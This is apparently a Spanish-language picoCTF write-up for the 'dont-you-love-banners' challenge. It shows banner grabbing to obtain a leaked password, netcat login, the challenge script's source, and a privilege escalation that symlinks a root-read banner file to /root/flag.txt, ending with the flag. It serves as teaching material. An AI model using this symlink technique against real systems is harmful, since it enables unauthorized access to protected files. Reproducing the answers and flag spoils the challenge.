# dont-you-love-banners

## Descripcion
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 50990`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 64431`. From the above information abuse the machine and find the flag in the /root directory.
## Solucion
Primero nos conectamos al primer servidor mencionado y obtenemos lo que parece ser una contraseña leakeada:
```shell
┌──(xrengariox㉿PC)-[~]
└─$ nc tethys.picoctf.net 50990                
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.
```

Después, ingresamos al segundo server y accedemos con la contraseña que acabamos de recibir, además de responder algunas preguntas:
```shell
┌──(xrengariox㉿PC)-[~]
└─$ nc tethys.picoctf.net 64431
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Inspeccionamos los archivos que existen.
```
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner  
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
```

Encontramos un archivo llamado banner, el cual investigamos, sin embargo solo muestra un pequeño banner, por lo que vemos ahora lo que existe en root.
```sh
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Apr 15 20:40 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
```

Encontramos un script que imprimía el banner y verificaba las respuestas de seguridad
```sh
player@challenge:~$ cat /root/script.py
```

```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

En el banner nos da una pista, por tanto, eliminamos el banner y creamos un enlace que apunte a flag.txt
```
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
```

Cortamos la conexión, y volvemos a ingresar.
```
┌──(xrengariox㉿PC)-[~]
└─$ nc tethys.picoctf.net 64431
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}

what is the password?
```

Y asi obtenemos la flag:
```flag
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```
## Notas adicionales

## Referencias
